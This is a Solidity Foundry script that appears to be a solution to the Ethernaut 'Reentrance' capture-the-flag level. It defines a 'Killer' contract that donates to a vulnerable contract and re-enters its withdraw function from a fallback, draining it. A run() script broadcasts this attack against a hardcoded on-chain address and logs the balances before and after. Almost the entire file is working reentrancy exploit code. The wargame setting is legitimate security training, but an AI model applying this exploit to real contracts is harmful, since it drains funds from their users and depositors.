// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;

import {Script, console} from "lib/forge-std/src/Script.sol";
import {Reentrance} from "../src/Reentrance.sol";

contract Killer {
    event attacked();
    uint256 prize;
    
    function attack(address payable target) public payable {
        prize = msg.value;
        Reentrance reentrance = Reentrance(target);
        reentrance.donate{value: prize}(address(this));
        reentrance.withdraw(prize);

    }

    fallback() external payable{
        if (msg.sender.balance >= prize) {
            Reentrance(msg.sender).withdraw(prize);
            emit attacked();
        }
    }
}

contract ReentranceSolution is Script {
    Reentrance public reentrance;
    Killer public killer;

    function run() external {
        vm.startBroadcast(); // vm.envUint("PRIVATE_KEY") <= Faulty
        // address vmAddr = vm.addr(0x...);
        // reentrance = new Reentrance();
        // address(reentrance).call{value: 1000000000000000 }("");

        // console.log("Ballance of deployer ", vmAddr, ": ", reentrance.balanceOf(vmAddr));
        
        // vm.stopBroadcast();
        // vm.startBroadcast(0x...);
        // vmAddr = vm.addr(0x...);
        reentrance = Reentrance(0x3D062D3f10D31CB38537A2e82498A340f6c2F139);
        killer = new Killer();
        console.log("Solving Reentrance...");

        // console.log("Ballance of hacker ", vmAddr, ": ", reentrance.balanceOf(vmAddr));
        console.log("Ballance of hacker's contract ", address(killer), ": ", reentrance.balanceOf(address(killer)));
        console.log("Initial balance: ", address(reentrance).balance);

        killer.attack{value: 500000000000000}(payable(reentrance));

        console.log("Final balance: ", address(reentrance).balance);
        console.log("Ballance of hacker's contract ", address(killer), ": ", reentrance.balanceOf(address(killer)));
        // console.log("Ballance of hacker ", vmAddr, ": ", reentrance.balanceOf(vmAddr));

        vm.stopBroadcast();
        console.log("Reentrance Solved!");
    }
}
